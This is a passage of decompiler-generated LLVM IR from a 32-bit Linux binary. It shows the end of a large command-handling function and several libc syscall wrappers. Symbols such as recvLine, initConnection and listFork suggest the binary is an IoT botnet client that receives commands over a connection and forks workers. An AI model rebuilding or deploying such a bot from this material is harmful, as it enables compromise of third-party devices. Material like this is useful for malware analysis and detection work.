  %v5_804d61a = icmp ult i32 %v0_804d61a250, 12
  store i1 %v5_804d61a, i1* %cf.global-to-local, align 1
  %v3_804d61d = inttoptr i32 %v0_804d61a250.in to i32*
  store i32 %v6_804d613, i32* %v3_804d61d, align 4
  %v1_804d61e = call i32 @free(i32 %storemerge251)
  %v0_804d623 = load i32, i32* @esp, align 4
  %v4_804d626 = add nuw nsw i32 %storemerge251, 1
  store i32 %v4_804d626, i32* %eax.global-to-local, align 4
  %v10_804d62c = icmp ult i32 %v4_804d626, %stack_var_-40.1.lcssa
  store i1 %v10_804d62c, i1* %cf.global-to-local, align 1
  %v5_804d62f = icmp slt i32 %v4_804d626, %stack_var_-40.1.lcssa
  br i1 %v5_804d62f, label %dec_label_pc_804d610, label %dec_label_pc_804d631.outer

dec_label_pc_804d631.outer:                       ; preds = %dec_label_pc_804d610, %dec_label_pc_804cf91
  %stack_var_-28.1.ph = phi i32 [ %stack_var_-28.0.ph, %dec_label_pc_804cf91 ], [ %v4_804d626, %dec_label_pc_804d610 ]
  %stack_var_-5832.2.ph = phi i32 [ %stack_var_-5832.0.ph, %dec_label_pc_804cf91 ], [ %stack_var_-5832.1, %dec_label_pc_804d610 ]
  %stack_var_-64.2.ph = phi i8* [ %stack_var_-64.0.ph, %dec_label_pc_804cf91 ], [ %v22_804d39a, %dec_label_pc_804d610 ]
  %stack_var_-60.3.ph = phi i32 [ %stack_var_-60.0.ph36, %dec_label_pc_804cf91 ], [ %stack_var_-60.2, %dec_label_pc_804d610 ]
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph37, %dec_label_pc_804cf91 ], [ %stack_var_-96.1, %dec_label_pc_804d610 ]
  br label %dec_label_pc_804d631.outer26

dec_label_pc_804d631.outer26:                     ; preds = %dec_label_pc_804d417, %dec_label_pc_804d5e5, %dec_label_pc_804d631.outer
  %stack_var_-5832.2.ph27 = phi i32 [ %stack_var_-5832.2.ph, %dec_label_pc_804d631.outer ], [ %stack_var_-5832.1, %dec_label_pc_804d5e5 ], [ %stack_var_-5832.1, %dec_label_pc_804d417 ]
  %stack_var_-64.2.ph28 = phi i8* [ %stack_var_-64.2.ph, %dec_label_pc_804d631.outer ], [ %v22_804d39a, %dec_label_pc_804d5e5 ], [ %v22_804d39a, %dec_label_pc_804d417 ]
  %stack_var_-60.3.ph29 = phi i32 [ %stack_var_-60.3.ph, %dec_label_pc_804d631.outer ], [ %stack_var_-60.2, %dec_label_pc_804d5e5 ], [ %stack_var_-60.2, %dec_label_pc_804d417 ]
  %stack_var_-96.2.ph30 = phi i32 [ %stack_var_-96.2.ph, %dec_label_pc_804d631.outer ], [ %stack_var_-96.1, %dec_label_pc_804d5e5 ], [ %stack_var_-96.1, %dec_label_pc_804d417 ]
  br label %dec_label_pc_804d631.outer31

dec_label_pc_804d631.outer31:                     ; preds = %dec_label_pc_804d2bf, %dec_label_pc_804d28b, %dec_label_pc_804d631.outer26
  %stack_var_-64.2.ph32 = phi i8* [ %stack_var_-64.2.ph28, %dec_label_pc_804d631.outer26 ], [ %tmp190, %dec_label_pc_804d28b ], [ %tmp190, %dec_label_pc_804d2bf ]
  %stack_var_-60.3.ph33 = phi i32 [ %stack_var_-60.3.ph29, %dec_label_pc_804d631.outer26 ], [ %stack_var_-60.2, %dec_label_pc_804d28b ], [ %stack_var_-60.2, %dec_label_pc_804d2bf ]
  %stack_var_-96.2.ph34 = phi i32 [ %stack_var_-96.2.ph30, %dec_label_pc_804d631.outer26 ], [ %stack_var_-96.1, %dec_label_pc_804d28b ], [ %stack_var_-96.1, %dec_label_pc_804d2bf ]
  %v2_804cff8 = ptrtoint i8* %stack_var_-64.2.ph32 to i32
  %v0_804d63d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d631

dec_label_pc_804d631:                             ; preds = %dec_label_pc_804d631.outer31, %dec_label_pc_804d225
  %v0_804d63d = phi i32 [ %v1_804d238, %dec_label_pc_804d225 ], [ %v0_804d63d.pre, %dec_label_pc_804d631.outer31 ]
  %stack_var_-60.3 = phi i32 [ %stack_var_-60.2, %dec_label_pc_804d225 ], [ %stack_var_-60.3.ph33, %dec_label_pc_804d631.outer31 ]
  store i32 %v2_804d631, i32* %eax.global-to-local, align 4
  %v0_804d637 = load i32, i32* @global_var_805a160.18, align 32
  store i32 %v0_804d637, i32* %edx.global-to-local, align 4
  %v5_804d63d = icmp ult i32 %v0_804d63d, 4
  store i1 %v5_804d63d, i1* %cf.global-to-local, align 1
  %v1_804d640 = add i32 %v0_804d63d, -8
  %v2_804d640 = inttoptr i32 %v1_804d640 to i32*
  store i32 4096, i32* %v2_804d640, align 4
  %v2_804d645 = add i32 %v0_804d63d, -12
  %v3_804d645 = inttoptr i32 %v2_804d645 to i32*
  store i32 %v2_804d631, i32* %v3_804d645, align 4
  %v0_804d646 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d646 = add i32 %v0_804d63d, -16
  %v3_804d646 = inttoptr i32 %v2_804d646 to i32*
  store i32 %v0_804d646, i32* %v3_804d646, align 4
  %v0_804d647 = call i32 @recvLine()
  store i32 %v0_804d647, i32* %eax.global-to-local, align 4
  %v0_804d64c = load i32, i32* @esp, align 4
  %v8_804d652 = icmp ne i32 %v0_804d647, -1
  store i1 %v8_804d652, i1* %cf.global-to-local, align 1
  %v13_804d652 = icmp eq i32 %v0_804d647, -1
  %v1_804d656 = icmp eq i1 %v13_804d652, false
  br i1 %v1_804d656, label %dec_label_pc_804d187, label %dec_label_pc_804cf79.outer

; uselistorder directives
  uselistorder i32 %v0_804d647, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-60.3, { 1, 0 }
  uselistorder i32 %v0_804d63d, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-96.2.ph34, { 0, 2, 1 }
  uselistorder i8* %stack_var_-64.2.ph32, { 2, 1, 0 }
  uselistorder i32 %stack_var_-5832.2.ph27, { 1, 0, 2 }
  uselistorder i32 %stack_var_-28.1.ph, { 1, 0, 3, 4, 2 }
  uselistorder i32 %v4_804d626, { 0, 3, 1, 2, 4 }
  uselistorder i32 %storemerge251, { 3, 2, 0, 1 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804d5e5, { 2, 1, 0 }
  uselistorder i32 %v3_804d5d0, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 0, 2, 1 }
  uselistorder i32 %v0_804d5c6, { 2, 1, 0 }
  uselistorder i32 %v1_804d590, { 1, 0 }
  uselistorder i32 %v1_804d55e, { 1, 0 }
  uselistorder i32 %v5_804d536, { 1, 0 }
  uselistorder i32 %v4_804d533, { 2, 1, 0, 3, 4 }
  uselistorder i32 %stack_var_-40.173, { 0, 5, 4, 2, 3, 1 }
  uselistorder i8* %v3_804d543, { 2, 0, 1 }
  uselistorder i32 %v1_804d51f, { 1, 0 }
  uselistorder i32 %v0_804d4e8, { 0, 2, 1 }
  uselistorder i32 %storemerge23.in.in, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804d4a5, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804d487, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804d46b, { 0, 1, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_804d458, { 1, 2, 0 }
  uselistorder i32 %v0_804d43d, { 1, 2, 3, 0 }
  uselistorder i1 %v0_804d400, { 1, 0 }
  uselistorder i32 %v7_804d3fe, { 1, 0 }
  uselistorder i8* %v22_804d39a, { 1, 2, 0 }
  uselistorder i8* %storemerge15, { 1, 0 }
  uselistorder i32 %v5_804d3c2, { 3, 2, 1, 0 }
  uselistorder i32 %v2_804d3b3, { 1, 0 }
  uselistorder i32 %storemerge15.in245, { 2, 1, 0 }
  uselistorder i8* %storemerge15246, { 1, 0 }
  uselistorder i32 %v6_804d36d, { 1, 0 }
  uselistorder i32 %v6_804d345, { 1, 0 }
  uselistorder i32 %stack_var_-5832.1, { 1, 2, 0, 3 }
  uselistorder i32 %v6_804d320, { 1, 0 }
  uselistorder i32 %v1_804d335, { 1, 0, 2, 3, 5, 4 }
  uselistorder i8* %v5_804d2fd, { 5, 0, 3, 1, 2, 4, 6, 8, 7 }
  uselistorder i32 %v1_804d2fa, { 10, 9, 16, 14, 7, 8, 12, 11, 0, 4, 1, 2, 3, 13, 15, 6, 5, 17, 18, 19 }
  uselistorder i32 %v6_804d2f7, { 1, 0 }
  uselistorder i32 %v5_804d2aa, { 0, 1, 4, 3, 2 }
  uselistorder i32 %stack_var_-96.1, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v4_804d263, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %v3_804d24f, { 0, 2, 1 }
  uselistorder i32 %v0_804d216, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v3_804d211, { 0, 2, 1 }
  uselistorder i32 %v0_804d1ff, { 1, 2, 0 }
  uselistorder i32 %v0_804d1a1, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v0_804d19b, { 1, 0, 2 }
  uselistorder i32 %storemerge17, { 2, 5, 4, 0, 3, 1 }
  uselistorder i32 %stack_var_-60.2, { 6, 3, 4, 1, 2, 0, 5, 8, 7 }
  uselistorder i32 %v0_804cff0.in, { 0, 3, 2, 1 }
  uselistorder i32 %v0_804d129, { 1, 0, 2 }
  uselistorder i32 %storemerge18, { 1, 3, 0, 2 }
  uselistorder i32 %v2_804d0f6, { 2, 0, 1 }
  uselistorder i32 %v1_804d0df, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_804d0aa, { 1, 0 }
  uselistorder i32 %v0_804d04f, { 1, 0, 2 }
  uselistorder i32 %storemerge19, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v2_804d01e, { 1, 0, 2 }
  uselistorder i32 %.pre, { 0, 2, 1 }
  uselistorder i32 %v2_804cfe1, { 1, 0 }
  uselistorder i8* %storemerge16209, { 2, 0, 1, 3 }
  uselistorder i32 %v5_804d297, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v2_804d424, { 6, 7, 0, 1, 2, 3, 4, 5, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %v2_804d631, { 15, 16, 0, 1, 6, 5, 7, 8, 2, 10, 9, 11, 12, 13, 14, 3, 4 }
  uselistorder i32 %v2_804cedf, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804ce86, { 2, 1, 0, 3, 4 }
  uselistorder i8* %tmp186, { 1, 0, 2 }
  uselistorder i32 %v2_804ce0a, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v7_804cdb7, { 1, 0 }
  uselistorder i32 %v3_804ce8313, { 1, 0 }
  uselistorder i32 %stack_var_-88.0, { 5, 4, 1, 0, 3, 2, 6 }
  uselistorder i32* %tmp182, { 1, 0, 2 }
  uselistorder i1 %v5_804ccfa, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v2_804ccbf, { 1, 0, 2 }
  uselistorder i1 %v5_804ccab, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v2_804cc1b, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-24, { 2, 1, 0, 3 }
  uselistorder i8** %stack_var_-5888, { 22, 25, 21, 20, 19, 16, 15, 18, 17, 24, 23, 14, 12, 11, 13, 10, 9, 8, 7, 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_-624, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-1648, { 1, 0, 2 }
  uselistorder i8** %stack_var_-36, { 3, 2, 1, 4, 0 }
  uselistorder i32* %edx.global-to-local, { 15, 16, 0, 1, 2, 3, 4, 5, 6, 7, 14, 9, 8, 10, 12, 11, 13, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 83, 84, 3, 1, 2, 133, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 21, 22, 16, 17, 18, 19, 20, 23, 24, 25, 26, 27, 36, 28, 29, 32, 33, 30, 31, 0, 134, 34, 35, 37, 38, 132, 131, 39, 40, 41, 44, 45, 46, 42, 43, 47, 48, 49, 50, 51, 52, 53, 54, 130, 136, 55, 56, 57, 58, 59, 60, 62, 63, 61, 64, 65, 66, 82, 67, 68, 71, 69, 70, 72, 73, 76, 74, 75, 77, 78, 79, 80, 81, 85, 86, 87, 89, 88, 135, 90, 91, 92, 93, 94, 97, 95, 96, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129 }
  uselistorder i1* %cf.global-to-local, { 60, 61, 2, 1, 0, 3, 4, 11, 5, 6, 7, 8, 9, 10, 120, 12, 13, 14, 19, 20, 15, 16, 17, 18, 21, 22, 23, 24, 25, 118, 28, 26, 27, 119, 29, 30, 117, 31, 32, 34, 35, 33, 36, 37, 38, 39, 116, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 59, 53, 54, 55, 56, 57, 58, 62, 63, 64, 67, 65, 66, 121, 68, 69, 70, 71, 72, 78, 79, 73, 74, 75, 115, 76, 77, 80, 81, 82, 85, 86, 87, 88, 89, 83, 84, 93, 94, 90, 91, 92, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 9, 8, 2, 1, 0, 7, 6, 5, 4, 3 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @szprintf, { 1, 0 }
  uselistorder i32 ()* @listFork, { 7, 3, 2, 1, 0, 6, 5, 4 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i8 13, { 0, 2, 1 }
  uselistorder i8 33, { 0, 2, 1 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_8056160.19 to i32), { 2, 1, 0 }
  uselistorder i32 ()* @trim, { 1, 0 }
  uselistorder i32 (i32, i32)* @Rootsprintf, { 15, 14, 13, 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 16, 1 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 1, 0 }
  uselistorder i32 ()* @sleep, { 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_80566db.179 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_80566cf.176 to i8*), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_80566c2.175 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_80566c0.174 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint ([19 x i8]* @global_var_80566ad.173 to i32), { 0, 2, 1 }
  uselistorder i32* inttoptr (i32 8 to i32*), { 5, 6, 0, 1, 2, 7, 3, 4 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 18, 19, 20, 1, 2, 3, 4, 5, 6, 7, 21, 22 }
  uselistorder i32* inttoptr (i32 12 to i32*), { 6, 0, 1, 2, 3, 7, 5, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_80566ac.172 to i32), { 0, 3, 2, 4, 1 }
  uselistorder label %dec_label_pc_804d631.outer31, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d631.outer26, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d610, { 1, 0 }
  uselistorder label %dec_label_pc_804d5c6, { 1, 0 }
  uselistorder label %dec_label_pc_804d533, { 1, 0 }
  uselistorder label %dec_label_pc_804d507, { 1, 0 }
  uselistorder label %dec_label_pc_804d4d1, { 1, 0 }
  uselistorder label %dec_label_pc_804d3a5, { 1, 0 }
  uselistorder label %dec_label_pc_804d394, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d38b, { 1, 0 }
  uselistorder label %dec_label_pc_804d327, { 1, 0 }
  uselistorder label %dec_label_pc_804d2bf, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d2b6, { 1, 0 }
  uselistorder label %dec_label_pc_804d28b, { 1, 0 }
  uselistorder label %dec_label_pc_804d184, { 1, 0 }
  uselistorder label %dec_label_pc_804d115, { 1, 0 }
  uselistorder label %dec_label_pc_804d0f3, { 1, 0 }
  uselistorder label %dec_label_pc_804d03b, { 1, 0 }
  uselistorder label %dec_label_pc_804d011, { 1, 0 }
  uselistorder label %dec_label_pc_804cf82, { 1, 0 }
  uselistorder label %dec_label_pc_804cf79.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804cf53, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ceda, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_804cdd5, { 1, 0 }
  uselistorder label %dec_label_pc_804cd33, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_804d66a = call i32 @vfork()
  %v5_804d66d = icmp ult i32 %v0_804d66a, -4095
  %v1_804d672 = icmp eq i1 %v5_804d66d, false
  call void @__pseudo_cond_branch(i1 %v1_804d672, i32 134551704)
  ret i32 %v0_804d66a
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804d67c = load i32, i32* @edi, align 4
  %v0_804d67d = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804d691 = add i32 %arg2, -12
  store i32 %arg3, i32* @edx, align 4
  %v6_804d69b = icmp ugt i32 %v1_804d691, 2
  br i1 %v6_804d69b, label %dec_label_pc_804d6ab, label %dec_label_pc_804d69d

dec_label_pc_804d69d:                             ; preds = %entry
  %v4_804d6a1 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804d691)
  br label %dec_label_pc_804d6cd

dec_label_pc_804d6ab:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804d6b3 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_804d6b3, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_804d6b3, -4095
  br i1 %tmp17, label %dec_label_pc_804d6cb, label %dec_label_pc_804d6bf

dec_label_pc_804d6bf:                             ; preds = %dec_label_pc_804d6ab
  %v1_804d6bf = call i32 @__errno_location(i32 %v0_804d67d)
  %v0_804d6c4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d6c4 = sub i32 0, %v0_804d6c4
  %v2_804d6c6 = inttoptr i32 %v1_804d6bf to i32*
  store i32 %v1_804d6c4, i32* %v2_804d6c6, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d6cb

dec_label_pc_804d6cb:                             ; preds = %dec_label_pc_804d6ab, %dec_label_pc_804d6bf
  %v0_804d6cb = phi i32 [ %v2_804d6b3, %dec_label_pc_804d6ab ], [ -1, %dec_label_pc_804d6bf ]
  br label %dec_label_pc_804d6cd

dec_label_pc_804d6cd:                             ; preds = %dec_label_pc_804d69d, %dec_label_pc_804d6cb
  %v0_804d6d2 = phi i32 [ %v4_804d6a1, %dec_label_pc_804d69d ], [ %v0_804d6cb, %dec_label_pc_804d6cb ]
  store i32 %v0_804d67d, i32* @ebx, align 4
  store i32 %v0_804d67c, i32* @edi, align 4
  ret i32 %v0_804d6d2

; uselistorder directives
  uselistorder i32 %v2_804d6b3, { 1, 0, 2 }
  uselistorder i32 %v0_804d67d, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804d6cd, { 1, 0 }
  uselistorder label %dec_label_pc_804d6cb, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d6d4 = load i32, i32* @edi, align 4
  store i32 %v0_804d6d4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_804d6ec = load i32, i32* @ebx, align 4
  %v1_804d6f4 = call i32 @int80_syscall(i32 221)
  store i32 %v1_804d6f4, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_804d6f4, -4095
  br i1 %tmp11, label %dec_label_pc_804d70c, label %dec_label_pc_804d700

dec_label_pc_804d700:                             ; preds = %entry
  %v1_804d700 = call i32 @__errno_location(i32 %v0_804d6ec)
  %v0_804d705 = load i32, i32* %edi.global-to-local, align 4
  %v1_804d705 = sub i32 0, %v0_804d705
  %v2_804d707 = inttoptr i32 %v1_804d700 to i32*
  store i32 %v1_804d705, i32* %v2_804d707, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804d70c

dec_label_pc_804d70c:                             ; preds = %entry, %dec_label_pc_804d700
  %v0_804d70c = phi i32 [ %v1_804d6f4, %entry ], [ -1, %dec_label_pc_804d700 ]
  %v2_804d711 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d711, i32* %edi.global-to-local, align 4
  ret i32 %v0_804d70c

; uselistorder directives
  uselistorder i32 %v1_804d6f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d70c, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804d715 = load i32, i32* @ebx, align 4
  store i32 %v0_804d715, i32* %stack_var_-8, align 4
  %v5_804d716 = icmp ult i32* %stack_var_-8, inttoptr (i32 4 to i32*)
  store i1 %v5_804d716, i1* @cf, align 1
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable

; uselistorder directives
  uselistorder i1* @cf, { 2, 0, 1 }
  uselistorder i32* inttoptr (i32 4 to i32*), { 2, 0, 1 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d73c = load i32, i32* @edi, align 4
  store i32 %v0_804d73c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804d744 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804d74c = call i32 @chdir(i32 %v0_804d744)
  store i32 %v0_804d744, i32* @ebx, align 4
  store i32 %v1_804d74c, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804d74c, -4095
  br i1 %tmp8, label %dec_label_pc_804d764, label %dec_label_pc_804d758

dec_label_pc_804d758:                             ; preds = %entry
  %v1_804d758 = call i32 @__errno_location(i32 %v0_804d744)
  %v0_804d75d = load i32, i32* %edi.global-to-local, align 4
  %v1_804d75d = sub i32 0, %v0_804d75d
  %v2_804d75f = inttoptr i32 %v1_804d758 to i32*
  store i32 %v1_804d75d, i32* %v2_804d75f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804d764

dec_label_pc_804d764:                             ; preds = %entry, %dec_label_pc_804d758
  %v0_804d764 = phi i32 [ %v1_804d74c, %entry ], [ -1, %dec_label_pc_804d758 ]
  %v2_804d766 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d766, i32* @edx, align 4
  %v2_804d768 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d768, i32* @edi, align 4
  ret i32 %v0_804d764

; uselistorder directives
  uselistorder i32 %v1_804d74c, { 1, 0, 2 }
  uselistorder i32 %v0_804d744, { 1, 0, 2 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d764, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d76c = load i32, i32* @edi, align 4
  store i32 %v0_804d76c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804d774 = load i32, i32* @ebx, align 4
  %v1_804d77c = call i32 @close(i32 %arg1)
  store i32 %v0_804d774, i32* @ebx, align 4
  store i32 %v1_804d77c, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804d77c, -4095
  br i1 %tmp8, label %dec_label_pc_804d794, label %dec_label_pc_804d788

dec_label_pc_804d788:                             ; preds = %entry
  %v1_804d788 = call i32 @__errno_location(i32 %v0_804d774)
  %v0_804d78d = load i32, i32* %edi.global-to-local, align 4
  %v1_804d78d = sub i32 0, %v0_804d78d
  %v2_804d78f = inttoptr i32 %v1_804d788 to i32*
  store i32 %v1_804d78d, i32* %v2_804d78f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804d794

dec_label_pc_804d794:                             ; preds = %entry, %dec_label_pc_804d788
  %v0_804d794 = phi i32 [ %v1_804d77c, %entry ], [ -1, %dec_label_pc_804d788 ]
  %v2_804d796 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d796, i32* @edx, align 4
  %v2_804d798 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d798, i32* @edi, align 4
  ret i32 %v0_804d794

; uselistorder directives
  uselistorder i32 %v1_804d77c, { 1, 0, 2 }
  uselistorder i32 %v0_804d774, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d794, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804d79c = load i32, i32* @ebx, align 4
  store i32 %v0_804d79c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_804d7af = call i32 @dup2(i32 %v0_804d79c, i32 %tmp4)
  store i32 %v2_804d7af, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_804d7af, -4095
  br i1 %tmp8, label %dec_label_pc_804d7c8, label %dec_label_pc_804d7bc

dec_label_pc_804d7bc:                             ; preds = %entry
  %v0_804d7bc = load i32, i32* %stack_var_-4, align 4
  %v1_804d7bc = call i32 @__errno_location(i32 %v0_804d7bc)
  %v0_804d7c1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d7c1 = sub i32 0, %v0_804d7c1
  %v2_804d7c3 = inttoptr i32 %v1_804d7bc to i32*
  store i32 %v1_804d7c1, i32* %v2_804d7c3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d7c8

dec_label_pc_804d7c8:                             ; preds = %entry, %dec_label_pc_804d7bc
  %v0_804d7c8 = phi i32 [ %v2_804d7af, %entry ], [ -1, %dec_label_pc_804d7bc ]
  %v2_804d7cc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d7cc, i32* @ebx, align 4
  ret i32 %v0_804d7c8

; uselistorder directives
  uselistorder i32 %v2_804d7af, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d7c8, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d7d0 = load i32, i32* @ebx, align 4
  store i32 %v0_804d7d0, i32* %stack_var_-4, align 4
  %v1_804d7d9 = call i32 @fork(i32 %v0_804d7d0)
  store i32 %v1_804d7d9, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804d7d9, -4095
  br i1 %tmp6, label %dec_label_pc_804d7f0, label %dec_label_pc_804d7e4

dec_label_pc_804d7e4:                             ; preds = %entry
  %v0_804d7e4 = load i32, i32* %stack_var_-4, align 4
  %v1_804d7e4 = call i32 @__errno_location(i32 %v0_804d7e4)
  %v0_804d7e9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d7e9 = sub i32 0, %v0_804d7e9
  %v2_804d7eb = inttoptr i32 %v1_804d7e4 to i32*
  store i32 %v1_804d7e9, i32* %v2_804d7eb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d7f0

dec_label_pc_804d7f0:                             ; preds = %entry, %dec_label_pc_804d7e4
  %v0_804d7f0 = phi i32 [ %v1_804d7d9, %entry ], [ -1, %dec_label_pc_804d7e4 ]
  %v2_804d7f2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d7f2, i32* @edx, align 4
  %v2_804d7f4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d7f4, i32* @ebx, align 4
  ret i32 %v0_804d7f0

; uselistorder directives
